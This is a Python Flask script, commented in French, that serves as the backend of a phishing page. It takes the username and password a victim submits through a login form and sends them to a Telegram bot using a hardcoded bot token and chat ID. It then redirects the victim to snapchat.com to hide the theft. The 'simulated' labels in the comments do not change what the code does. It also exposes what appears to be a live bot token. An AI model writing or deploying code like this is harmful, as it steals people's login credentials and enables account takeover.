# Ligne d'importation ACTUELLE :
from flask import Flask, request, jsonify, redirect, url_for 
import requests

app = Flask(__name__)

# --- VARIABLES DE CONFIGURATION SIMULÉES ---
# Remplacez VOS_TOKENS par vos vrais jetons si vous testez, mais gardez ce fichier secret!
TELEGRAM_BOT_TOKEN_SIMULE = "8556128794:AAE5e_vJogpX4QKD1-RjqE-CpINUk6EDKUM"
TELEGRAM_CHAT_ID_SIMULE = "1949276292"

# L'URL de l'API de Telegram pour envoyer des messages
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_SIMULE}/sendMessage"

# --- ROUTE DE TRAITEMENT DU FORMULAIRE ---
@app.route('/traitement_connexion', methods=['POST'])
def handle_login_data():
    # 1. Réception et Extraction des Données
    # 'username' et 'password' sont les 'name' des champs dans le HTML
    data = request.form
    # Remplacez 'username' et 'password' si votre test précédent a montré des clés différentes !
    username_recu = data.get('id_29', 'Utilisateur_INCONNU') 
    password_recu = data.get('id_30', 'Mot_de_passe_INCONNU')

    # --- SIMULATION DE L'ENVOI DE DONNÉES À TELEGRAM ---
    message_a_envoyer = (
        f"🚨 NOUVELLE CONNEXION 🚨\n\n"
        f"👤 Identifiant: {username_recu}\n"
        f"🔑 Mot de passe: {password_recu}\n"
        f"🌐 Source: Formulaire de connexion simulé"
    )

    payload = {
        'chat_id': TELEGRAM_CHAT_ID_SIMULE,
        'text': message_a_envoyer
    }

    try:
        # Envoi de la requête POST à l'API Telegram
        response = requests.post(TELEGRAM_API_URL, data=payload)

        if response.status_code == 200:
            print(f"[SUCCESS] Message Telegram envoyé pour {username_recu}")
        else:
            print(f"[ERROR] Erreur d'envoi Telegram: {response.text}")

    except Exception as e:
        print(f"[NETWORK ERROR] Échec de la connexion à l'API Telegram: {e}")


    # 2. Réponse au Navigateur
    # IMPORTANT : En temps normal, vous redirigeriez ici l'utilisateur.
    URL_DE_REDIRECTION = "https://www.snapchat.com/" # <-- Votre URL ici

    return redirect(URL_DE_REDIRECTION, code=302)

if __name__ == '__main__':
    # Lance le serveur Flask sur http://127.0.0.1:5000/
    app.run(debug=True)